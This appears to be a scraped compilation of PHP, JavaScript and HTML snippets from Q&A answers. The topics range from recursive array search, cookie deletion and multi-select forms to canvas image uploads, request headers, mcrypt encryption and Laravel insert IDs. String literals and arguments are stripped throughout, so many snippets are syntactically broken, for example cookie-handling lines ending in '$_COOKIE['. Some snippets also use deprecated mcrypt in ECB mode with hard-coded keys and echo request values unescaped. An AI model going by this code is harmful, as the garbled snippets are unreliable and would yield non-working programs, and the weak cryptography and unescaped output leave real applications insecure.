function chopExtension($filename) { return pathinfo($filename, PATHINFO_FILENAME); } var_dump(chopExtension( var_dump(chopExtension(
function chopExtension($filename) { return substr($filename, 0, strrpos($filename, }
str_replace(".php", "", basename($_SERVER["SCRIPT_NAME"]));
echo basename(__FILE__) . echo basename(__FILE__, echo __FILE__ . echo basename($_SERVER["REQUEST_URI"]) . echo $_SERVER["REQUEST_URI"] . echo basename($_SERVER[ echo basename($_SERVER[ echo $_SERVER[ echo basename($_SERVER["SCRIPT_FILENAME"], echo basename($_SERVER["SCRIPT_FILENAME"]) . echo $_SERVER["SCRIPT_FILENAME"] . echo pathinfo(__FILE__, PATHINFO_FILENAME) . echo pathinfo(__FILE__, PATHINFO_EXTENSION) . echo basename($_SERVER[
$filename = "jquery.js.php"; $ext = pathinfo($filename, PATHINFO_EXTENSION); $file_basename = pathinfo($filename, PATHINFO_FILENAME);
echo __FILE__; echo strrchr( __FILE__ , echo substr( strrchr( __FILE__ , echo basename(__FILE__,
$currentPage= $_SERVER["SCRIPT_NAME"]; $currentPage = substr($currentPage, 1); echo $currentPage;
$a = array("Mac", "NT", "Irix", "Linux"); if (in_array("Irix", $a)) { echo "Got Irix"; }
$b = array(array("Mac", "NT"), array("Irix", "Linux")); print_r($b);
function in_array_r($needle, $haystack, $strict = false) { foreach ($haystack as $item) { if (($strict ? $item === $needle : $item == $needle) || (is_array($item) && in_array_r($needle, $item, $strict))) { return true; } } return false; }
$b = array(array("Mac", "NT"), array("Irix", "Linux")); echo in_array_r("Irix", $b) ?
function in_array_r($item , $array){ return preg_match( }
$userdb = Array ( (0) => Array ( ( ( ( ), (1) => Array ( ( ( ( ), (2) => Array ( ( ( ( ) ); if(array_search( echo } else { echo }
foreach($b as $value) { if(in_array("Irix", $value, true)) { echo "Got Irix"; } }
$array = array( array("name" => "Robert", "Age" => "22", "Place" => "TN"), array("name" => "Henry", "Age" => "21", "Place" => "TVL") );
function in_multiarray($elem, $array,$field) { $top = sizeof($array) - 1; $bottom = 0; while($bottom <= $top) { if($array[$bottom][$field] == $elem) return true; else if(is_array($array[$bottom][$field])) if(in_multiarray($elem, ($array[$bottom][$field]))) return true; $bottom++; } return false; }
function in_array_r($needle, $haystack) { $found = false; foreach ($haystack as $item) { if ($item === $needle) { $found = true; break; } elseif (is_array($item)) { $found = in_array_r($needle, $item); if($found) { break; } } } return $found; }
$userdb = Array ( (0) => Array ( ( ( ( ), (1) => Array ( ( ( ( ), (2) => Array ( ( ( ( ) ); $url_in_array = in_array( if($url_in_array) { echo } else { echo }
$arr = array(array("Mac", "NT"), array("Irix", "Linux")); $in_arr = (bool)strpos(serialize($arr), if($in_arr){ echo "Got Irix!"; }
function in_array_count($needle, $haystack, $caseSensitive = true) { if(!$caseSensitive) { return substr_count(strtoupper(json_encode($haystack)), strtoupper($needle)); } return substr_count(json_encode($haystack), $needle); }
<?php $a=array("Mac"=>"NT","Irix"=>"Linux"); if (array_key_exists("Mac",$a)) { echo "Key exists!"; } else { echo "Key does not exist!"; } ?>
function in_array_r($needle, $haystack, $strict = false) { foreach ($haystack as $item) { if (($strict ? $item === $needle : $item == $needle) || (is_array($item) && in_array_r($needle, $item, $strict))) { return true; } } return false; }
function in_array_r($needle, $haystack, $strict = false) { foreach ($haystack as $item) { if( ! $strict && is_string( $needle ) && ( is_float( $item ) || is_int( $item ) ) ) { $item = (string)$item; } if (($strict ? $item === $needle : $item == $needle) || (is_array($item) && in_array_r($needle, $item, $strict))) { return true; } } return false; }
<?php function in_multiarray($elem, $array) { if( is_array( $array ) || is_object( $array ) ) { if( is_object( $array ) ) { $temp_array = get_object_vars( $array ); if( in_array( $elem, $temp_array ) ) return TRUE; } if( is_array( $array ) && in_array( $elem, $array ) ) return TRUE; foreach( $array as $array_element ) { if( ( is_array( $array_element ) || is_object( $array_element ) ) && $this->in_multiarray( $elem, $array_element ) ) { return TRUE; exit; } } } return FALSE; } ?>
$arr = array("key1"=>"value1","key2"=>"value2","key3"=>"value3"); foreach ($arr as $row) $vector[] = $row[ in_array($needle,$vector);
function in_array_r($array, $field, $find){ foreach($array as $item){ if($item[$field] == $find) return true; } return false; } $is_found = in_array_r($os_list,
/** * Recursive in_array function * Searches recursively for needle in an array (haystack). * Works with both strings and arrays as needle. * Both needle * Note: if needle is an array, all values in needle have to be found for it to * return true. If one value is not found, false is returned. * @param mixed $needle The array or string to be found * @param array $haystack The array to be searched in * @param boolean $strict Use strict value & type validation (===) or just value * @return boolean True if in array, false if not. */ function in_array_r($needle, $haystack, $strict = false) { if (is_array($needle)) { foreach ($needle as $value) { if (in_array_r($value, $haystack, $strict) == false) { return false; } } return true; } foreach ($haystack as $item) { if (($strict ? $item === $needle : $item == $needle) || (is_array($item) && in_array_r($needle, $item, $strict))) { return true; } } return false; }
in_array("irix",array_keys($b)) in_array("Linux",array_keys($b["irix"])
if( array_search("Irix", $a) === true) { echo "Got Irix"; }
$result = array_intersect($array1, $array2); print_r($result);
<?php $arr1 = array(2, 3); $arr2 = $arr1; $arr2[] = 4; $arr3 = &$arr1; $arr3[] = 4; ?>
function my_func($a) { $a[] = 30; } $arr = array(10, 20); my_func($arr); var_dump($arr);
function handle_array($my_array) { print_r($my_array); }
function handle_array($my_array) { $my_array[] = "New value"; }
<?php function printArray($array) {} $x = array(1); printArray($x);
<?php $x = array_fill(0, 10000, 1); function readArray($arr) { echo count($arr); } readArray($x);
<?php $start_memory = memory_get_usage(); $x = array_fill(0, 10000, 1); echo memory_get_usage() - $start_memory;
<?php function printUsedMemory($arr) { $start_memory = memory_get_usage(); count($arr); $x = $arr[0]; $arr[0] - $arr[1]; echo memory_get_usage() - $start_memory; } $x = array_fill(0, 10000, 1); printUsedMemory($x);
<?php function printUsedMemory($arr) { $start_memory = memory_get_usage(); $arr[0] = 1; echo memory_get_usage() - $start_memory; } $x = array_fill(0, 10000, 1); printUsedMemory($x);
<?php function printUsedMemory(&$arr) { $start_memory = memory_get_usage(); $arr[0] = 1; echo memory_get_usage() - $start_memory; } $x = array_fill(0, 10000, 1); printUsedMemory($x);
<?php $obj=new stdClass(); $obj->field= $original=array($obj); function example($hello) { $hello[0]->field= $hello[1]=new stdClass(); $ } example($original); var_dump($original);
function test(&$array) { $array[ } $a = $array(1,2,3); var_dump($a); test($a); var_dump($a);
$a = array(1,2,3); $b = &$a; var_dump($b); $b[ var_dump($a);
$date = new DateTime(); $arr = [ echo $date->format( mytest($arr); echo $date->format( function mytest($params = []) { if (isset($params[ $params[ } }
$foo = array(11, 22, 33); function hello($fooarg) { $fooarg[0] = 99; } function world(&$fooarg) { $fooarg[0] = 66; } hello($foo); var_dump($foo); world($foo); var_dump($foo);
array(3) { [0]=> int(11) [1]=> int(22) [2]=> int(33) } array(3) { [0]=> int(66) [1]=> int(22) [2]=> int(33) }
if (isset($_COOKIE[ unset($_COOKIE[ unset($_COOKIE[ setcookie( setcookie( return true; } else { return false; }
$cookiePath = "/"; $cookieExpire = time()+(60*60*24); setcookie("CookieName",$cookieValue,$cookieExpire,$cookiePath);
setcookie("cookieName","", time()-3600, $cookiePath); unset ($_COOKIE[
Set-Cookie: user_id=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0 Set-Cookie: session=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0
foreach ($_COOKIE as $key => $value) { unset($value); setcookie($key, }
setcookie ("TestCookie", "", time() - 3600, "/~rasmus/", "example.com", 1);
if (isset($_COOKIE[ unset($_COOKIE[ unset($_COOKIE[ setcookie( setcookie( return true; } else { return false; }
if (isset($_COOKIE[ setcookie( setcookie( unset($_COOKIE[ unset($_COOKIE[ return true; } else { return false; }
$cookie_name = "my cookie"; $cookie_value = "my value"; $cookie_new_value = "my new value"; setcookie($cookie_name, $cookie_value , time() + (86400 * 30), "/"); $cookie_value = $_COOKIE[$cookie_name]; setcookie($cookie_name, $cookie_new_value , time() + (86400 * 30), "/"); setcookie($cookie_name,
session_start(); if(isset($_COOKIE[ $_SESSION[ } echo ($_SESSION[
function unset_cookie($cookie_name) { if (isset($_COOKIE[$cookie_name])) { unset($_COOKIE[$cookie_name]); setcookie($cookie_name, null, -1); } else { return false; } }
unset($_COOKIE[ setcookie("hello", "", time() - 300,"/");
Name: key Content: Deleted Created: Sunday, November 18, 2018 at 2:33:14 PM Expires: Sunday, November 18, 2018 at 2:33:14 PM
if ($_GET[ echo ' <script type="text/javascript"> var delete_cookie = function(name) { document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:01 GMT;"; }; delete_cookie("madw"); delete_cookie("usdw"); </script> unset($_COOKIE[ unset($_COOKIE[
<?php header("Content-Type: text/plain"); foreach ($_GET[ echo $selectedOption."\n";
<?php print <<<_HTML_ <html> <body> <form method="post" action="value.php"> <select name="flower[ ]" multiple> <option value="flower">FLOWER</option> <option value="rose">ROSE</option> <option value="lilly">LILLY</option> <option value="jasmine">JASMINE</option> <option value="lotus">LOTUS</option> <option value="tulips">TULIPS</option> </select> <input type="submit" name="submit" value=Submit> </form> </body> </html> _HTML_ ?>
<?php foreach ($_POST[ { print "You are selected $names<br/>"; } ?>
<form action="c3.php" method="post"> <select name="ary[]" multiple="multiple"> <option value="Option 1" >Option 1</option> <option value="Option 2">Option 2</option> <option value="Option 3">Option 3</option> <option value="Option 4">Option 4</option> <option value="Option 5">Option 5</option> </select> <input type="submit"> </form>
<?php $values = $_POST[ foreach ($values as $a){ echo $a; } ?>
<html> <head> <title>Untitled Document</title> </head> <body> <form id="form1" name="form1" method="get" action="display.php"> <table width="300" border="1"> <tr> <td><label>Multiple Selection </label>&nbsp;</td> <td><select name="select2[]" size="3" multiple="multiple" tabindex="1"> <option value="11">eleven</option> <option value="12">twelve</option> <option value="13">thirette</option> <option value="14">fourteen</option> <option value="15">fifteen</option> <option value="16">sixteen</option> <option value="17">seventeen</option> <option value="18">eighteen</option> <option value="19">nineteen</option> <option value="20">twenty</option> </select> </td> </tr> <tr> <td>&nbsp;</td> <td><input type="submit" name="Submit" value="Submit" tabindex="2" /></td> </tr> </table> </form> </body> </html>
$selectvalue=$_GET[ foreach ($selectvalue as $value) echo $value."\n";
<?php if ($_POST) { foreach($_POST[ echo $selected."<br>"; } } ?>
<?php $mySelection = $_GET[ $nSelection = count($MySelection); for($i=0; $i < $nSelection; $i++) { $numberVal = $MySelection[$i]; if ($numberVal == "11"){ echo("Eleven"); } else if ($numberVal == "12"){ echo("Twelve"); } ... ... } ?>
<form action="ResultsDulith.php" id="intermediate" name="inputMachine[]" multiple="multiple" method="post"> <select id="selectDuration" name="selectDuration[]" multiple="multiple"> <option value="1 WEEK" >Last 1 Week</option> <option value="2 WEEK" >Last 2 Week </option> <option value="3 WEEK" >Last 3 Week</option> <option value="4 WEEK" >Last 4 Week</option> <option value="5 WEEK" >Last 5 Week</option> <option value="6 WEEK" >Last 6 Week</option> </select> <input type="submit"/> </form>
for(i=0; i < form.select.options.length; i++) if (form.select.options[i].selected) form.hidden.value += form.select.options[i].value;
foreach ($_POST["select2"] as $selectedOption) { echo $selectedOption."\n"; }
<?php function trim_words($what, $words, $char_list = if(!is_array($words)) return false; $char_list .= " \t\n\r\0\x0B"; $pattern = "(".implode("|", array_map( $str = trim(preg_replace( return $str; } $trim_list = array( $what = print_r(trim_words($what, $trim_list)); $what = print_r(trim_words($what, $trim_list, ?>
function saveImage() { var canvasData = canvas.toDataURL("image/png"); var ajax = new XMLHttpRequest(); ajax.open("POST", "testSave.php", false); ajax.onreadystatechange = function() { console.log(ajax.responseText); } ajax.setRequestHeader("Content-Type", "application/upload"); ajax.send("imgData=" + canvasData); }
<?php if (isset($GLOBALS["HTTP_RAW_POST_DATA"])) { $imageData = $GLOBALS[ $filteredData = substr($imageData, strpos($imageData, ",") + 1); $unencodedData = base64_decode($filteredData); $fp = fopen( fwrite($fp, $unencodedData); fclose($fp); } ?>
$data = $_POST[ $file = "/path/to/file.png"; $uri = substr($data,strpos($data, ",") + 1); file_put_contents($file, base64_decode($uri)); echo $file;
function saveImage() { var canvasData = canvas.toDataURL("image/png"); var xmlHttpReq = false; if (window.XMLHttpRequest) { ajax = new XMLHttpRequest(); } else if (window.ActiveXObject) { ajax = new ActiveXObject("Microsoft.XMLHTTP"); } ajax.open("POST", "testSave.php", false); ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); ajax.onreadystatechange = function() { console.log(ajax.responseText); } ajax.send("imgData=" + canvasData); }
<canvas id="myCanvas" width="578" height="200"></canvas> <script> var canvas = document.getElementById( var context = canvas.getContext( context.beginPath(); context.moveTo(170, 80); context.bezierCurveTo(130, 100, 130, 150, 230, 150); context.bezierCurveTo(250, 180, 320, 180, 340, 150); context.bezierCurveTo(420, 150, 420, 120, 390, 100); context.bezierCurveTo(430, 40, 370, 30, 340, 50); context.bezierCurveTo(320, 5, 250, 20, 250, 50); context.bezierCurveTo(200, 5, 150, 20, 170, 80); context.closePath(); context.lineWidth = 5; context.fillStyle = context.fill(); context.strokeStyle = context.stroke(); </script>
$.ajax({ type: "POST", url: "script.php", data: { imgBase64: dataURL } }).done(function(o) { console.log( });
document.getElementById( document.forms["form1"].submit();
<?php $upload_dir = somehow_get_upload_dir(); $img = $_POST[ $img = str_replace( $img = str_replace( $data = base64_decode($img); $file = $upload_dir."image_name.png"; $success = file_put_contents($file, $data); header( ?>
dataURLtoBlob = (dataURL) -> binary = atob(dataURL.split( array = [] i = 0 while i < binary.length array.push binary.charCodeAt(i) i++ new Blob([ new Uint8Array(array) ], type:
canvas = document.getElementById( file = dataURLtoBlob(canvas.toDataURL())
fd = new FormData fd.append $.ajax type: url: data: fd processData: false contentType: false
<?php $data = $_POST[ list($type, $data) = explode( list(, $data) = explode( $data = base64_decode($data); mkdir($_SERVER[ file_put_contents($_SERVER[ die; ?>
<?php $encodedData = str_replace( $decocedData = base64_decode($encodedData); ?>
function b64ToUint8Array(b64Image) { var img = atob(b64Image.split( var img_buffer = []; var i = 0; while (i < img.length) { img_buffer.push(img.charCodeAt(i)); i++; } return new Uint8Array(img_buffer); } var b64Image = canvas.toDataURL( var u8Image = b64ToUint8Array(b64Image); var formData = new FormData(); formData.append("image", new Blob([ u8Image ], {type: "image/jpg"})); var xhr = new XMLHttpRequest(); xhr.open("POST", "/api/upload", true); xhr.send(formData);
Begin init1 = timer(); the loop begin some code the loop end total = timer() - init1; End
$start = microtime(true); while (...) { } $time_elapsed_secs = microtime(true) - $start;
$time_end = microtime(true); $execution_time = ($time_end - $time_start)/60; echo
<?php usleep(mt_rand(100, 10000)); $time = microtime(true) - $_SERVER["REQUEST_TIME_FLOAT"]; echo "Did stuff in $time seconds\n"; ?>
<?php class loadTime{ private $time_start = 0; private $time_end = 0; private $time = 0; public function __construct(){ $this->time_start= microtime(true); } public function __destruct(){ $this->time_end = microtime(true); $this->time = $this->time_end - $this->time_start; echo "Loaded in $this->time seconds\n"; } }
$start = microtime(true); for ($i = 0; $i < 10000; ++$i) { } $total = microtime(true) - $start; echo $total;
include( const SOME_CODE = ' strlen("foo bar"); $t = timeit(SOME_CODE); print "$t[0] loops; $t[2] per loop\n";
$tRecordStart = microtime(true); header("Content-Type: text/plain"); recordTime("Start"); function recordTime ($sName) { global $tRecordStart; static $tStartQ; $tS = microtime(true); $tElapsedSecs = $tS - $tRecordStart; $tElapsedSecsQ = $tS - $tStartQ; $sElapsedSecs = str_pad(number_format($tElapsedSecs, 3), 10, " ", STR_PAD_LEFT); $sElapsedSecsQ = number_format($tElapsedSecsQ, 3); echo " if (!empty($tStartQ)) echo " In ".$sElapsedSecsQ."s"; echo "\n"; $tStartQ = $tS; }
recordTime("Something Else") recordTime("Really Long Operation") recordTime("A Short Operation") for ($i = 0; $i < 300; $i ++) { recordTime("Loop Cycle ".$i) }
<?php $time_start = microtime(true); $time_end = microtime(true); $total_time = $time_end - $time_start; echo $total_time; ?>
/** * MICROSECOND STOPWATCH FOR PHP * * Class FnxStopwatch */ class FnxStopwatch { /** @var float */ private $start, $stop; public function start() { $this->start = self::microtime_float(); } public function stop() { $this->stop = self::microtime_float(); } public function getIntervalSeconds() : float { if (empty($this->start)) return 0; if (empty($this->stop)) return ($this->stop - self::microtime_float()); return $interval = $this->stop - $this->start; } /** * FOR MORE INFO SEE http: * * @return float */ private static function microtime_float() : float { list($usec, $sec) = explode(" ", microtime()); return ((float)$usec + (float)$sec); } }
<?php class debugTimer { private $startTime; private $callsCounter; function __construct() { $this->startTime = microtime(true); $this->callsCounter = 0; } public function getTimer(): float { $timeEnd = microtime(true); $time = $timeEnd - $this->startTime; $this->callsCounter++; return $time; } public function getCallsNumer(): int { return $this->callsCounter; } } $timer = new debugTimer(); usleep(100); echo usleep(100); echo
if (($_POST[ or ($_POST[ or ($_POST[ or ($_POST[ echo "enter"; }
$arraysAreEqual = ($a == $b); $arraysAreEqual = ($a === $b);
<?php (array("x","y") == array("y","x")) === false; ?>
<?php function array_equal($a, $b) { return ( is_array($a) && is_array($b) && count($a) == count($b) && array_diff($a, $b) === array_diff($b, $a) ); } ?>
$foo =serialize($array_foo); $bar =serialize($array_bar); if ($foo == $bar) echo "Foo and bar are equal";
public static function arrays_are_equal($array1, $array2) { array_multisort($array1); array_multisort($array2); return ( serialize($array1) === serialize($array2) ); }
$array1 = array(2,5,3); $array2 = array(5,2,3); if($array1 === array_intersect($array1, $array2) && $array2 === array_intersect($array2, $array1)) { echo } else { echo }
$array1 = array( array(5, 2), array(3, 6), array(2, 9, 4) ); $array2 = array( array(3, 6), array(2, 9, 4), array(5, 2) ); if($array1 === array_uintersect($array1, $array2, echo } else { echo } function compare($v1, $v2) { if ($v1===$v2) { return 0; } if ($v1 > $v2) return 1; return -1; }
function rksort($a) { if (!is_array($a)) { return $a; } foreach (array_keys($a) as $key) { $a[$key] = ksort($a[$key]); } ksort($a, SORT_STRING); return $a; } function considered_equal($a1, $a2) { return json_encode(rksort($a1)) === json_encode(rksort($a2)); }
array array_diff ( array $array1 , array $array2 [, array $... ] )
if (array_diff($a,$b) == array_diff($b,$a)) { } if (array_diff($a,$b) != array_diff($b,$a)) { }
$array1 = array( ); $array2 = array( ); $diff = array_diff(array1, array2); var_dump($diff);
$array1 = array( ); $array2 = array( ); $diff = array_diff(array1, array2); var_dump($diff);
$array1 = array( ); $array2 = array( ); $diff = array_diff($array1, $array2); var_dump($diff);
$myString = "9,admin@example.com,8"; $myArray = explode( print_r($myArray);
Array ( [0] => 9 [1] => admin@example.com [2] => 8 )
$myString = "9,admin@example.com,8"; $myArray = explode( foreach($myArray as $my_Array){ echo $my_Array. }
$string = "9,admin@example.com,8"; $array = explode(",", $string); print_r($array); $no = 1; foreach ($array as $line) { echo $no . ". " . $line . PHP_EOL; $no++; };
$string = "ab,cdefg,xyx,ht623"; $resultArr = []; $strLength = strlen($string); $delimiter = $j = 0; $tmp = for ($i = 0; $i < $strLength; $i++) { if($delimiter === $string[$i]) { $j++; $tmp = continue; } $tmp .= $string[$i]; $resultArr[$j] = $tmp; }
Array ( [0] => ab [1] => cdefg [2] => xyx [3] => ht623 )
$stmt = $dbh->prepare( if ($stmt->execute(array( var_dump($stmt->fetchAll()); }
function buildQuery( $get_var ) { switch($get_var) { case 1: $tbl = break; } $sql = "SELECT * FROM $tbl"; }
function getTableInfo($inTableName, $inColumnName) { .... }
$allowed_tables_array = array( $allowed_columns_array[
if(in_array($inTableName, $allowed_tables_array) && in_array($inColumnName,$allowed_columns_array[$inTableName])) { $sql = "SELECT $inColumnName AS columnInfo FROM $inTableName"; $stmt = $pdo->prepare($sql); $stmt->execute(); $result = $stmt->fetchAll(PDO::FETCH_ASSOC); }
class myPdo{ private $user = private $pass = private $host = private $db = private $pdo; private $dbInfo; public function __construct($type){ $this->pdo = new PDO( if(isset($type)){ $stmt = "select distinct column_name,column_type from information_schema.columns where table_name= $stmt = $this->pdo->prepare($stmt); $stmt->execute(); $this->dbInfo = $stmt->fetchAll(PDO::FETCH_ASSOC); } } public function pdo_param($col){ $param_type = PDO::PARAM_STR; foreach($this->dbInfo as $k => $arr){ if($arr[ if(strstr($arr[ $param_type = PDO::PARAM_INT; break; } } } return $param_type; } public function columnIsAllowed($col){ $colisAllowed = false; foreach($this->dbInfo as $k => $arr){ if($arr[ $colisAllowed = true; break; } } return $colisAllowed; } public function q($data){ $data = json_decode($data,TRUE); $continue = true; foreach($data[ if(!$this->columnIsAllowed($column_name)){ $continue = false; break; } } if(isset($data[ $continue = false; } if(!$continue){ exit( } $stmt = "SELECT DISTINCT ".$data[ foreach($data[ $stmt .= $k. } $stmt = substr($stmt,0,-5)." order by ".$data[ $stmt = $this->pdo->prepare($stmt); foreach($data[ $stmt->bindValue( } $stmt->execute(); return $stmt->fetchAll(PDO::FETCH_ASSOC); } } $pdo = new myPdo( var_dump($pdo->q($some_json_object_as_described_above));
<?php $headers = apache_request_headers(); foreach ($headers as $header => $value) { echo "$header: $value <br />\n"; }
<?php function getRequestHeaders() { $headers = array(); foreach($_SERVER as $key => $value) { if (substr($key, 0, 5) <> continue; } $header = str_replace( $headers[$header] = $value; } return $headers; } $headers = getRequestHeaders(); foreach ($headers as $header => $value) { echo "$header: $value <br />\n"; }
$headers = array(); foreach ($_SERVER as $key => $value) { if (strpos($key, $headers[str_replace( } }
if (!function_exists( foreach ($_SERVER as $name => $value) { /* RFC2616 (HTTP/1.1) defines header fields as case-insensitive entities. */ if (strtolower(substr($name, 0, 5)) == $headers[str_replace( } } $this->request_headers = $headers; } else { $this->request_headers = getallheaders(); }
/** * @var string $headerName case insensitive header name * * @return string|null header value or null if not found */ function get_header($headerName) { $headers = getallheaders(); return isset($headerName) ? $headers[$headerName] : null; }
<?php /** * @param $pHeaderKey * @return mixed */ function get_header( $pHeaderKey ) { $headerKey = str_replace( $headerKey = strtoupper($headerKey); $headerValue = NULL; $headerValue = $_SERVER[ $headerKey ]; return $headerValue; } $header_x_requested_with = get_header(
<?php function getHeaders($header_name=null) { $keys=array_keys($_SERVER); if(is_null($header_name)) { $headers=preg_grep("/^HTTP_(.*)/si", $keys); } else { $header_name_safe=str_replace("-", "_", strtoupper(preg_quote($header_name))); $headers=preg_grep("/^HTTP_${header_name_safe}$/si", $keys); } foreach($headers as $header) { if(is_null($header_name)){ $headervals[substr($header, 5)]=$_SERVER[$header]; } else { return $_SERVER[$header]; } } return $headervals; } print_r(getHeaders()); echo "\n\n".getHeaders("Accept-Language"); ?>
Array ( [HOST] => 127.0.0.1 [USER_AGENT] => Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0 [ACCEPT] => text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 [ACCEPT_LANGUAGE] => en-US,en;q=0.5 [ACCEPT_ENCODING] => gzip, deflate [COOKIE] => PHPSESSID=MySessionCookieHere [CONNECTION] => keep-alive ) en-US,en;q=0.5
function get_header($field) { $headers = headers_list(); foreach ($headers as $header) { list($key, $value) = preg_split( if ($key == $field) return $value; } }
<?php foreach($_SERVER as $key => $value){ echo } ?>
function getCustomHeaders() { $headers = array(); foreach($_SERVER as $key => $value) { if(preg_match("/^HTTP_X_/", $key)) $headers[$key] = $value; } return $headers; }
$headers = apache_request_headers(); foreach ($headers as $header => $value) { echo "$header: $value <br />\n"; }
Accept: */* Accept-Language: en-us Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 Host: www.example.com Connection: Keep-Alive
$staticIdentifications = array( Users::userID => "USERID", Users::username => "USERNAME" ); $companyVarIdentifications = CompanyVars::getIdentificationVarsFriendly($_SESSION[ $idVars = array_merge($staticIdentifications, $companyVarIdentifications);
>> $a = array(1, 2, 3); array ( 0 => 1, 1 => 2, 2 => 3, ) >> $b = array("a" => 1, "b" => 2, "c" => 3) array ( ) >> $a + $b array ( 0 => 1, 1 => 2, 2 => 3, )
$a = array( $b = array(42 => $merged = array_replace($a, $b);
$empty_option = array( ); $option_list = array( 1=> 2=> 3=> ); $arr_option = $empty_option + $option_list;
function splitNewLine($text) { $code=preg_replace( return explode("\n",$code); }
$a="\r\n\r\n\n\n\r\rsalam\r\nman khobam\rto chi\n\rche khabar\n\r\n\n\r\r\n\nbashe baba raftam\r\n\r\n\r\n\r\n"; print_r( splitNewLine($a) );
Array ( [0] => salam [1] => man khobam [2] => to chi [3] => che khabar [4] => bashe baba raftam )
<textarea id="txtArea" name="txtArea" rows="40" cols="170"></textarea> <br> <input type="submit" value="split lines into array" />
$txtArea = $txtArea = $_POST[ $TA = $_POST[ $string = $TA; $array = preg_split ( echo "<br>A0: ".$array[0]; echo "<br>A1: ".@$array[1]; echo "<br>A2: ".@$array[2];
$uniquepattern="@ $skuList=explode($uniquepattern,str_replace("\r","",str_replace("\n",$uniquepattern,$_POST[
$myString = "Prepare yourself to be caught You in the hood gettin We going throw hell of blows got my whole frame froze"; $myArray = explode(PHP_EOL, $myString); print_r($myArray);
$iv = mcrypt_create_iv( mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC), MCRYPT_DEV_URANDOM ); $encrypted = base64_encode( $iv . mcrypt_encrypt( MCRYPT_RIJNDAEL_128, hash( $string, MCRYPT_MODE_CBC, $iv ) );
$data = base64_decode($encrypted); $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)); $decrypted = rtrim( mcrypt_decrypt( MCRYPT_RIJNDAEL_128, hash( substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)), MCRYPT_MODE_CBC, $iv ), "\0" );
echo var_dump($encrypted); echo "\n"; echo var_dump($decrypted);
class Encryption { var $skey = "yourSecretKey"; public function safe_b64encode($string) { $data = base64_encode($string); $data = str_replace(array( return $data; } public function safe_b64decode($string) { $data = str_replace(array( $mod4 = strlen($data) % 4; if ($mod4) { $data .= substr( } return base64_decode($data); } public function encode($value){ if(!$value){return false;} $text = $value; $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_ECB); $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND); $crypttext = mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $this->skey, $text, MCRYPT_MODE_ECB, $iv); return trim($this->safe_b64encode($crypttext)); } public function decode($value){ if(!$value){return false;} $crypttext = $this->safe_b64decode($value); $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_ECB); $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND); $decrypttext = mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $this->skey, $crypttext, MCRYPT_MODE_ECB, $iv); return trim($decrypttext); } }
$str = "My secret String"; $converter = new Encryption; $encoded = $converter->encode($str ); $decoded = $converter->decode($encoded); echo "$encoded<p>$decoded";
define( function encrypt($text) { return trim(base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_256, SALT, $text, MCRYPT_MODE_ECB, mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_ECB), MCRYPT_RAND)))); } function decrypt($text) { return trim(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, SALT, base64_decode($text), MCRYPT_MODE_ECB, mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_ECB), MCRYPT_RAND))); } $encryptedmessage = encrypt("your message"); echo decrypt($encryptedmessage);
function encryptStringArray ($stringArray, $key = "Your secret salt thingie") { $s = strtr(base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_256, md5($key), serialize($stringArray), MCRYPT_MODE_CBC, md5(md5($key)))), return $s; } function decryptStringArray ($stringArray, $key = "Your secret salt thingie") { $s = unserialize(rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, md5($key), base64_decode(strtr($stringArray, return $s; }
<?php public function saveDetailsCompany() { $post = Input::All(); $data = new Company; $data->nombre = $post[ $data->direccion = $post[ $data->telefono = $post[ $data->email = $post[ $data->giro = $post[ $data->fecha_registro = date("Y-m-d H:i:s"); $data->fecha_modificacion = date("Y-m-d H:i:s"); if ($data->save()) { return Response::json(array( } }
public function store() { $input = Request::all(); $id = Company::create($input)->id; return redirect( }
use App\Http\Requests\UserStoreRequest; class UserController extends Controller { private $user; public function __construct( User $user ) { $this->user = $user; } public function store( UserStoreRequest $request ) { $user= $this->user->create([ ]); $lastInsertedId= $user->id; } }
public static function saveTutorial(){ $data = Input::all(); $Tut = new Tutorial; $Tut->title = $data[ $Tut->tutorial = $data[ $Tut->save(); $LastInsertId = $Tut->id; return Response::json(array( }
public function store() { $input = Input::all(); $validation = Validator::make($input, user::$rules); if ($validation->passes()) { $user= $this->user->create(array( )); $lastInsertedId= $user->id; $userId= array( $user->update($userId); return Redirect::route( } return Redirect::route( }
$id = Model::insertGetId(["name"=>"Niklesh","email"=>"myemail@gmail.com"]);
$report = new Report(); $report->user_id = $request->user_id; $report->patient_id = $request->patient_id; $report->diseases_id = $request->modality; $isReportCreated = $report->save(); return $report->id;
public function saveContact(Request $request, Contact $contact) { $create = $contact->create($request->all()); return response()->json($create->id, 201); }
$objPost = new Post; $objPost->title = $objPost->description = $objPost->save(); $recId = $objPost->id; return Response::json([
$insert_id = CreditVoucher::insert($data1); $id = DB::getPdo()->lastInsertId(); dd($id);
$user = new Report(); $user->email= $user->save(); $lastId = $user->id;
$data = new YourModelName; $data->name = $data->email = $data->save(); $lastInsertedId = $data->id;
public function create(array $data): MyModel { $myModel = new MyModel($dataArray); $myModel->saveOrFail(); return $myModel->refresh(); }
public function store( UserStoreRequest $request ) { $input = $request->all(); $user = User::create($input); $userId=$user->id }
